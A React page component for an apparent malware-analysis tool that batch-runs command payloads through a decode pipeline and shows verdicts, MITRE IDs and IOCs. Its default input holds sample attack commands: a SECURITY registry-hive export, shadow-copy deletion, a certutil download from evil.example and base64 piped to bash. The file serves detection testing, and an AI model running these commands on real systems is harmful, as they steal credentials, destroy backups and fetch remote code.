/**
 * BatchTestPage — /batch-test
 *
 * Analyst tool that runs 1–500 payloads through the deterministic decode
 * pipeline in a single request and returns a color-coded results matrix
 * plus a CSV export button. Handy for regression-testing new archetypes,
 * A/B-comparing analysis modes, or vetting a corpus in under a minute.
 *
 * Backend endpoints:
 *   POST /api/batch/test/json       — pure JSON path, used for the table
 *   POST /api/batch/test            — CSV/multipart path, used for export
 *   GET  /api/batch/test/example    — starter CSV template
 */
import { useEffect, useMemo, useState } from "react";
import Header from "@/components/Header";
import api, { API_BASE } from "@/lib/api";
import { Download, Upload, Play, FileText, AlertCircle } from "lucide-react";

const MODES = ["fast", "balanced", "deep"];
const VERDICT_COLOR = {
  Malicious:  "#ef4444",
  Suspicious: "#f59e0b",
  Unknown:    "#6b7280",
  Benign:     "#10b981",
};

export default function BatchTestPage() {
  const [text, setText]   = useState(
    "powershell -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcAaGVsbG8nAA==\n" +
    "reg.exe export HKLM\\SECURITY C:\\Windows\\Temp\\sec.reg /y\n" +
    "vssadmin delete shadows /all /quiet\n" +
    "certutil -urlcache -split -f http://evil.example/x.exe C:\\temp\\x.exe\n" +
    "echo 'aGVsbG8gd29ybGQ=' | base64 -d | bash"
  );
  const [mode, setMode]   = useState("balanced");
  const [rows, setRows]   = useState([]);
  const [summary, setSummary] = useState(null);
  const [busy, setBusy]   = useState(false);
  const [err, setErr]     = useState(null);
  const [runId, setRunId] = useState(null);
  const [history, setHistory] = useState([]);
  const [showHistory, setShowHistory] = useState(false);

  const loadHistory = async () => {
    try {
      const r = await api.get("/batch/history", { params: { limit: 30 } });
      setHistory(r.data?.runs || []);
    } catch (_) { setHistory([]); }
  };
  useEffect(() => { loadHistory(); }, []);

  const reloadRun = async (id) => {
    setBusy(true); setErr(null);
    try {
      const r = await api.get(`/batch/history/${id}`);
      setRows(r.data.rows || []);
      setSummary(r.data.summary || null);
      setRunId(id);
      setShowHistory(false);
    } catch (e) {
      setErr(e.response?.data?.detail || e.message);
    } finally { setBusy(false); }
  };

  const deleteRun = async (id) => {
    if (!window.confirm("Delete this batch run?")) return;
    try {
      await api.delete(`/batch/history/${id}`);
      loadHistory();
    } catch (_) {}
  };

  const payloadCount = useMemo(
    () => text.split("\n").map(l => l.trim()).filter(Boolean).length, [text]
  );

  const run = async () => {
    setBusy(true); setErr(null);
    const payloads = text.split("\n").map(l => l.trim()).filter(Boolean);
    try {
      const r = await api.post("/batch/test/json",
        { payloads, analysis_mode: mode, include_full_output: false },
        { timeout: 120_000 });
      setRows(r.data.rows || []);
      setSummary(r.data.summary || null);
      setRunId(r.data.run_id || null);
      loadHistory();
    } catch (e) {
      setErr(e.response?.data?.detail || e.message);
      setRows([]); setSummary(null);
    } finally {
      setBusy(false);
    }
  };

  const onFile = async (e) => {
    const f = e.target.files?.[0]; if (!f) return;
    setBusy(true); setErr(null);
    try {
      const fd = new FormData();
      fd.append("file", f);
      fd.append("analysis_mode", mode);
      fd.append("format", "json");
      const r = await api.post("/batch/test", fd,
        { headers: { "Content-Type": "multipart/form-data" }, timeout: 180_000 });
      setRows(r.data.rows || []);
      setSummary(r.data.summary || null);
      setRunId(r.data.run_id || null);
      loadHistory();
      // reflect the parsed payloads back into the textarea (aids re-run)
      setText((r.data.rows || []).map(row => row.input_snippet).join("\n"));
    } catch (e2) {
      setErr(e2.response?.data?.detail || e2.message);
    } finally {
      setBusy(false); e.target.value = "";
    }
  };

  const downloadCsv = async () => {
    const payloads = text.split("\n").map(l => l.trim()).filter(Boolean);
    if (!payloads.length) return;
    const blob = new Blob(
      [ [
          "id,payload",
          ...payloads.map((p, i) => `"row-${String(i+1).padStart(4, "0")}","${p.replace(/"/g, '""')}"`)
        ].join("\n")
      ],
      { type: "text/csv" });
    const fd = new FormData();
    fd.append("file", new File([blob], "batch_input.csv", { type: "text/csv" }));
    fd.append("analysis_mode", mode);
    fd.append("format", "csv");
    try {
      const r = await api.post("/batch/test", fd, {
        headers: { "Content-Type": "multipart/form-data" },
        responseType: "blob", timeout: 180_000,
      });
      const url = URL.createObjectURL(r.data);
      const a = document.createElement("a");
      a.href = url; a.download = "nivxray_batch_results.csv";
      a.click(); URL.revokeObjectURL(url);
    } catch (e) {
      setErr(e.response?.data?.detail || e.message);
    }
  };

  return (
    <div data-testid="batch-test-page">
      <Header />
      <main style={{ maxWidth: 1400, margin: "0 auto", padding: "16px 24px" }}>
        <div style={{ marginBottom: 12 }}>
          <h1 style={{ fontSize: 22, margin: 0, color: "var(--text)" }}>
            Batch Analyst Testing
          </h1>
          <p style={{ margin: "4px 0 0", fontSize: 12, color: "var(--text-dim)" }}>
            Paste 1–500 payloads (one per line) or upload a CSV.
            Every row runs through the deterministic pipeline &amp; enrichment.
            Export the matrix as CSV for reporting.
          </p>
        </div>

        <div className="nvx-card" style={{ marginBottom: 12 }}>
          <div className="nvx-card-head">
            <div className="nvx-card-title">Input Payloads</div>
            <div style={{ display: "flex", alignItems: "center", gap: 8, fontSize: 11, color: "var(--text-dim)" }}>
              <span data-testid="batch-payload-count">{payloadCount} payload{payloadCount === 1 ? "" : "s"}</span>
              <span>·</span>
              <label>
                Mode:{" "}
                <select value={mode} onChange={e => setMode(e.target.value)}
                        data-testid="batch-mode-select"
                        style={{ background: "var(--bg-mute)", color: "var(--text)",
                                  border: "1px solid var(--border)", borderRadius: 4,
                                  padding: "2px 6px", fontFamily: "JetBrains Mono", fontSize: 11 }}>
                  {MODES.map(m => <option key={m} value={m}>{m}</option>)}
                </select>
              </label>
            </div>
          </div>
          <div className="nvx-card-body">
            <textarea
              data-testid="batch-input-textarea"
              value={text}
              onChange={e => setText(e.target.value)}
              rows={10}
              spellCheck={false}
              style={{ width: "100%", fontFamily: "JetBrains Mono", fontSize: 12,
                        background: "var(--bg-deep)", color: "var(--text)",
                        border: "1px solid var(--border)", borderRadius: 6,
                        padding: 10, resize: "vertical" }}
            />
            <div style={{ display: "flex", flexWrap: "wrap", gap: 8, marginTop: 10, alignItems: "center" }}>
              <button onClick={run} disabled={busy || payloadCount === 0}
                      data-testid="batch-run-btn"
                      className="nvx-btn sm primary">
                <Play size={12} /> {busy ? "RUNNING…" : `RUN ${payloadCount} PAYLOAD${payloadCount === 1 ? "" : "S"}`}
              </button>
              <button onClick={downloadCsv} disabled={busy || payloadCount === 0}
                      data-testid="batch-download-btn"
                      className="nvx-btn sm ghost">
                <Download size={12} /> DOWNLOAD RESULTS AS CSV
              </button>
              <label className="nvx-btn sm ghost" style={{ cursor: "pointer" }}
                     data-testid="batch-upload-btn">
                <Upload size={12} /> UPLOAD .CSV / .JSON
                <input type="file" accept=".csv,.json,.txt" onChange={onFile}
                       style={{ display: "none" }} />
              </label>
              <a href={`${API_BASE}/batch/test/example`}
                 data-testid="batch-example-link"
                 target="_blank" rel="noreferrer"
                 className="nvx-btn sm ghost">
                <FileText size={12} /> DOWNLOAD EXAMPLE CSV
              </a>
              <button
                onClick={() => { setShowHistory(v => !v); if (!showHistory) loadHistory(); }}
                data-testid="batch-history-btn"
                className="nvx-btn sm ghost"
                style={{ borderColor: showHistory ? "#7ee3c9" : undefined, color: showHistory ? "#7ee3c9" : undefined }}>
                <FileText size={12} /> HISTORY {history.length ? `(${history.length})` : ""}
              </button>
              {runId && rows.length > 0 && (
                <button
                  onClick={async () => {
                    const nm = window.prompt("Name this batch run (for future reference):", `Batch · ${new Date().toLocaleString()}`);
                    if (!nm) return;
                    try {
                      await api.patch(`/batch/history/${runId}`, { name: nm });
                      await loadHistory();
                      alert(`Saved as "${nm}"`);
                    } catch (e) {
                      alert(`Save failed: ${e.response?.data?.detail || e.message}`);
                    }
                  }}
                  data-testid="batch-save-btn"
                  className="nvx-btn sm primary">
                  <Download size={12} /> 💾 SAVE THIS RUN
                </button>
              )}
              <button
                onClick={async () => {
                  setBusy(true); setErr(null);
                  try {
                    const r = await api.post("/batch/evaluate/nxgec?analysis_mode=" + mode,
                                              null, { timeout: 180_000 });
                    // Adapt the NXGEC rows into the standard results shape
                    const adapted = (r.data.rows || []).map((row, i) => ({
                      id: row.id, input_snippet: row.input_snippet,
                      engine: row.engine, confidence: row.confidence,
                      verdict: row.verdict,
                      chain_ops: `[NXGEC v${row.volume} ${row.overall_pass ? '✓ PASS' : '✗ FAIL'}] ` + (row.chain_ops || ""),
                      mitre_ids: row.mitre_ids, lolbins: row.lolbins,
                      iocs_ips: row.iocs_ips, iocs_domains: row.iocs_domains,
                      iocs_urls: row.iocs_urls, iocs_hashes: row.iocs_hashes,
                      decoded_snippet: `EXPECTED: mitre=${row.diff.expected_mitre.join(",")} lol=${row.diff.expected_lolbin.join(",")} sev=${row.diff.expected_severity} · GOT: ${row.decoded_snippet}`,
                      reached_shellcode: row.reached_shellcode,
                    }));
                    setRows(adapted);
                    setSummary({
                      malicious: r.data.passed,
                      suspicious: r.data.failed,
                      unknown: 0, errors: 0,
                      shellcode_reached: r.data.pass_rate,
                    });
                    setText(adapted.map(x => x.input_snippet).join("\n"));
                  } catch (e) {
                    setErr(e.response?.data?.detail || e.message);
                  } finally { setBusy(false); }
                }}
                disabled={busy}
                data-testid="batch-nxgec-btn"
                className="nvx-btn sm primary" style={{ background: "#7ee3c9", color: "#0b1220" }}>
                <FileText size={12} /> RUN NXGEC GOLD CORPUS (55 CASES)
              </button>
              {err && (
                <span style={{ color: VERDICT_COLOR.Malicious, fontSize: 11, display: "flex", alignItems: "center", gap: 4 }}
                      data-testid="batch-error">
                  <AlertCircle size={12} /> {err}
                </span>
              )}
            </div>
          </div>
        </div>

        {summary && (
          <div className="nvx-card" style={{ marginBottom: 12 }} data-testid="batch-summary">
            <div className="nvx-card-head">
              <div className="nvx-card-title">Summary</div>
            </div>
            <div className="nvx-card-body" style={{ display: "flex", flexWrap: "wrap", gap: 16, fontFamily: "JetBrains Mono", fontSize: 12 }}>
              {[
                ["Total",             rows.length,               "var(--text)"],
                ["Malicious",         summary.malicious,         VERDICT_COLOR.Malicious],
                ["Suspicious",        summary.suspicious,        VERDICT_COLOR.Suspicious],
                ["Unknown",           summary.unknown,           VERDICT_COLOR.Unknown],
                ["Errors",            summary.errors,            VERDICT_COLOR.Malicious],
                ["Shellcode Reached", summary.shellcode_reached, "#a855f7"],
              ].map(([k, v, c]) => (
                <div key={k} data-testid={`batch-summary-${k.toLowerCase().replace(/\s+/g,"-")}`}>
                  <span style={{ color: "var(--text-dim)" }}>{k}: </span>
                  <span style={{ color: c, fontWeight: 600 }}>{v}</span>
                </div>
              ))}
            </div>
          </div>
        )}

        {rows.length > 0 && (
          <div className="nvx-card" data-testid="batch-results-card">
            <div className="nvx-card-head">
              <div className="nvx-card-title">Results Matrix</div>
              <span style={{ fontSize: 11, color: "var(--text-dim)" }}>
                {rows.length} row{rows.length === 1 ? "" : "s"}
              </span>
            </div>
            <div className="nvx-card-body" style={{ overflowX: "auto", padding: 0 }}>
              <table className="mono" style={{
                width: "100%", borderCollapse: "collapse", fontSize: 11
              }} data-testid="batch-results-table">
                <thead>
                  <tr style={{ background: "var(--bg-deep)", textAlign: "left" }}>
                    {["#","Payload","Engine","Conf","Verdict","Chain","MITRE","IOCs","Decoded"].map(h => (
                      <th key={h} style={{ padding: "8px 10px", color: "var(--text-dim)",
                                            borderBottom: "1px solid var(--border)",
                                            whiteSpace: "nowrap" }}>{h}</th>
                    ))}
                  </tr>
                </thead>
                <tbody>
                  {rows.map((row, i) => (
                    <tr key={row.id} data-testid={`batch-row-${i}`}
                        style={{ borderBottom: "1px solid var(--border)",
                                  background: i % 2 ? "transparent" : "rgba(255,255,255,0.02)" }}>
                      <td style={{ padding: "6px 10px", color: "var(--text-mute)" }}>{i + 1}</td>
                      <td style={{ padding: "6px 10px", maxWidth: 260, overflow: "hidden",
                                    textOverflow: "ellipsis", whiteSpace: "nowrap",
                                    color: "var(--text)" }}
                          title={row.input_snippet}>{row.input_snippet}</td>
                      <td style={{ padding: "6px 10px", color: "var(--accent)" }}>{row.engine}</td>
                      <td style={{ padding: "6px 10px", color: "var(--text)" }}>{row.confidence}</td>
                      <td style={{ padding: "6px 10px",
                                    color: VERDICT_COLOR[row.verdict] || "var(--text)",
                                    fontWeight: 600 }}>
                        {row.verdict}
                      </td>
                      <td style={{ padding: "6px 10px", maxWidth: 220, overflow: "hidden",
                                    textOverflow: "ellipsis", whiteSpace: "nowrap",
                                    color: "var(--text-dim)" }}
                          title={row.chain_ops}>{row.chain_ops || "—"}</td>
                      <td style={{ padding: "6px 10px", color: "var(--text-dim)" }}
                          title={row.mitre_ids}>{row.mitre_ids || "—"}</td>
                      <td style={{ padding: "6px 10px", color: "var(--text-dim)" }}>
                        {[row.iocs_ips, row.iocs_domains, row.iocs_urls, row.iocs_hashes]
                          .filter(Boolean).join(" · ") || "—"}
                      </td>
                      <td style={{ padding: "6px 10px", maxWidth: 320, overflow: "hidden",
                                    textOverflow: "ellipsis", whiteSpace: "nowrap",
                                    color: "var(--text-mute)" }}
                          title={row.decoded_snippet}>{row.decoded_snippet || "—"}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
